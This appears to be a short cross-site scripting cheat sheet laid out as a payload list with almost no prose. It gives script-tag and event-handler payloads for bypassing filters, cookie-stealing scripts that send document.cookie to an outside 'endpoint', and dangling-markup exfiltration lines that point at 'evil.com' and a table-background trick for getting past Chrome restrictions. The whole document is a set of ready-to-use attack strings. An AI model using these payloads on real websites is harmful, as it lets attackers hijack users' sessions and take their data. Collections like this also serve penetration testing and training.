# Cheat Sheet XSS
## Execute code
### XSS without filters
```html
<script>alert()</script>
```
### Bypass script tags
```html
<img src="" onerror="alert()">
<body onload="alert()">
```
## Get cookies from another user
```html
<script>document.location.replace("http://endpoint?cookie="+document.cookie)</script>
<script>document.location.replace("http://endpoint?cookie=".concat(document.cookie))</script>
```
## Data exfiltration
### Dangling Markup
```html
<img src="http://endpoint?data=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
```

Bypass Chrome Restrictions:
```html
<table background='//endpoint?data'
```
